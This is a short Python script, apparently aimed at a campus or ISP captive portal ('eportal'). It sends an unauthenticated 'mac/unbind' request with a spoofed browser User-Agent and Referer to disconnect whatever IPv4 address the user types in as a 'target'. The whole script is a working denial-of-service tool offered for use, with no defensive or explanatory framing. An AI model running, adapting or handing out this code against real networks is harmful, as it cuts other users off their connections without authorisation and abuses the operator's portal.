import requests

def int_to_ip(integer_value):
    # 计算每个字节的值
    a = (integer_value >> 24) & 0xFF
    b = (integer_value >> 16) & 0xFF
    c = (integer_value >> 8) & 0xFF
    d = integer_value & 0xFF
    return f"{a}.{b}.{c}.{d}"

def ip_to_int(ip_address):
    # 将 IP 地址分割为四个部分
    a, b, c, d = map(int, ip_address.split('.'))
    # 计算整数值
    return (a << 24) + (b << 16) + (c << 8) + d

def cutdown(ipint):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "*/*",
        "Referer": "http://192.168.10.154/"
    }
    r = requests.get(f"http://192.168.10.154:801/eportal/portal/mac/unbind?wlan_user_mac=000000000000&wlan_user_ip={ipint}",headers=headers)
    print("[+] Sending Request....")
    if r.status_code == 200:
      print(f"[+] The ip Address {int_to_ip(ipint)} Now has been shutdown.")
    else:
        print('[*] Oops,got some issues')
        print(f"Status_Code: {r.status_code}")

if __name__ == "__main__":
    ipAddress = input("Target that u wanna cutdown?(ipv4):")
    print(f"[*] Target:{ipAddress}")
    cutdown(ip_to_int(ipAddress))
